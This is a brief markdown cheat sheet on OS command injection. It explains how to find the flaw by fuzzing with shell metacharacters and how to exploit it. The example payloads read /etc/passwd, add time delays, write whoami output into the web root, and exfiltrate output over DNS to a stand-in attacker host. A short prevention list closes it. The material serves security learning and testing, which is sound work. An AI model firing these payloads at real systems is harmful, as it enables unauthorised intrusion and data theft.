# OS Command Injection

</br>

## Definition
- It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data.

</br>

---

## How To Find
- Identify all instances where the web application appears to be interacting with the underlying operating system.
- Fuzz the application using shell metacharacters such as: `&` `&&` `|` `||` `;` `\n` `` ` `` `$()`.
- For in-band command injection, analyze the response of the application to determine if it’s vulnerable.
- For blind command injection, you can:
    - Trigger a time delay using the `ping -c 10 127.0.0.1` or `sleep 10` command.
    - Output the response of the command in the web root and retrieve the file directly using a browser. 
    - Open an out-of-band channel back to a server you control.

<br/>

---
## How To Exploit
- Concatenate another command.
    - Example: `& cat /etc/passwd &`
- Trigger a time delay.
    - Example: `& sleep 10 &`
- Output the response of the command in the web root and retrieve the file directly using a browser.
    - Example: `& whoami > /var/www/static/whoami.txt &`
- Open an out-of-band channel back to a server you control.
    - Example: ``nslookup 'whoami` .kgji2ohoyw.web-attacker.com`` 
</br>

---
## How To Prevent
- Avoid system calls and user input.
- Set up input validation.
- Create a white list—of possible inputs, to ensure the system accepts only pre-approved inputs.